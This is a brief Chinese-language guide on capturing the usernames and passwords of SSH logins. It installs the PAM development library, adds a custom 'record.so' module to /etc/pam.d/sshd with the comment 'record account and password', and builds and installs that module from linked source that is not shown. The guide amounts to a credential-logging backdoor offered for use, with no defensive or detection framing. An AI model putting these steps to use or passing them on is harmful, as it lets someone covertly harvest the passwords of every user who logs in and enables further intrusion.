## 如何获得ssh登录用户名和密码？

1. 安装PAM

   ```bash
   $ sudo apt install libpam0g-dev
   ```

2. 配置ssh对应的PAM配置文件

   ```bash
   $ vim /etc/pam.d/sshd
   # record account and password
   auth	optional	record.so
   ```

3. 通过[源码](../../resources/code/c/pam)编译，生成动态库 record.so，并且安装到系统中

   ```bash
   $ cd pam/
   $ make
   $ make install
   ```

